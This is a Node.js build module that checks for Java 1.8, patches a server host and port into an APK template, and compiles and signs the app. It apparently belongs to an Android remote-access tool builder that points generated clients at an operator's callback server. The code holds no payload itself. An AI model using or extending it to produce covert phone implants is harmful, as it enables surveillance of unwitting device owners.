const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
        if (javaVersion !== "" || openJDKVersion !== "") {
            if (javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0")) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 1.8.0", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    // Sanitize URI and PORT
    if (!/^[a-zA-Z0-9.-]+$/.test(URI)) return cb('Invalid URI');
    let portInt = parseInt(PORT);
    if (isNaN(portInt) || portInt < 2048 || portInt > 25565) return cb('Invalid Port');

    if (portInt < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            
            // Patch 3: Guard against missing markers
            let startIdx = data.indexOf("http://");
            let endIdx = data.indexOf("?model=");
            if (startIdx === -1 || endIdx === -1) return cb('Corrupted APK Template - Markers Missing');

            var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + portInt);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    } else return cb(false); // Patch 4: Ensure callback fires even if port is 25565
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
